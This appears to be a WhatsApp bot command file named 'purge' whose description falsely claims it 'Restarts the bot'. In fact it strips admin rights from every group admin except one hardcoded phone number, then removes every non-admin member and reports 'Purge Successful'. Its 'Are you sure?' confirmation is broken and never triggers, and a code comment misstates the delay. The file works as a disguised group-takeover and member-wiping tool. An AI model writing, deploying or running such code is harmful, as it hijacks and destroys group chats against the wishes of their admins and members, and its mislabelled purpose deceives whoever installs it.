module.exports = {
    name: 'purge',
    aliases: ['purgE'],
    category: 'dev',
    cool: 120,
    exp: 0,
    react: "✅",
    description: 'Restarts the bot',
    async execute(client, arg, M) {
        const groupMetadata = await client.groupMetadata(M.from)
const groupMembers = groupMetadata?.participants || []
const groupAdmins = groupMembers.filter((v) => v.admin && v.id !== '15065034983@s.whatsapp.net').map((v) => v.id) 

await client.groupParticipantsUpdate(M.from, groupAdmins, 'demote').then((res) => {
    M.reply(`Done! ${groupAdmins.length} in sab ko admin se hata diya hn`)
})

        
        try {
            const groupMetadata = await client.groupMetadata(M.from);
            const purgeSet = new Set();
            const addToPurge = async (id) => {
              purgeSet.add(id);
              setTimeout(() => purgeSet.delete(id), 60000);
            };
            if (purgeSet.has(groupMetadata?.id || '')) {
              addToPurge(groupMetadata?.id || '')
              return M.reply(
                "Are you sure? This will remove everyone from the group chat. Use this command again if you'd like to proceed"
              )
            }
            for (const user of groupMetadata.participants) {
              if (!user.admin) {
                await new Promise((resolve) => setTimeout(resolve, 1900)); // wait 3 seconds
                await client.groupParticipantsUpdate(M.from, [user.id], 'remove');
              }
            }
            await M.reply('*🚥Status:* \n\n💣Purge Successful');
          } catch (error) {
            console.error(error);
            await M.reply('An error occurred while purging the group members.');
          }
    }
}
